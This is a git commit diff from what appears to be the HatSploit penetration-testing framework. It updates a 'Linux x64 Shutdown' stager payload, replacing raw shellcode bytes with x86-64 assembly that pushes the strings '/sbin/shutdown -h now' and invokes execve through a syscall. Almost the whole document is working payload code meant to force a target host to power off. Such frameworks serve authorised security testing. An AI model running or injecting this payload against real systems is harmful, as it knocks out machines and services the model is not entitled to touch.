920e6f9a6ecd8907fbdf6938ac7b99428d1b7d74
Ivan Nikolsky <enty8080@gmail.com>
2022-01-18 20:34:42 +0300

    Update shutdown.py

--- hatsploit/payloads/linux/x64/shutdown.py
+++ hatsploit/payloads/linux/x64/shutdown.py
@@ -6,9 +6,10 @@
 #
 
 from hatsploit.lib.payload import Payload
+from hatsploit.utils.payload import PayloadTools
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, PayloadTools):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Shutdown",
@@ -24,14 +25,36 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        return (
-            b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
-            b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
-            b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
-            b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
-            b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
-            b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
-            b"\x50\x48\x89\xe7\x52\x53\x51\x57"
-            b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
-            b"\x05"
+        return self.assemble(
+            self.details['Architecture'],
+            """
+            start:
+                xor rax, rax
+                xor rdx, rdx
+
+                push rax
+                push byte 0x77
+                push word 0x6f6e
+                mov rbx, rsp
+
+                push rax
+                push word 0x682d
+                mov rcx, rsp
+
+                push rax
+                mov r8, 0x2f2f2f6e6962732f
+                mov r10, 0x6e776f6474756873
+                push r10
+                push r8
+                mov rdi, rsp
+
+                push rdx
+                push rbx
+                push rcx
+                push rdi
+                mov rsi, rsp
+
+                add rax, 59
+                syscall
+            """
         )
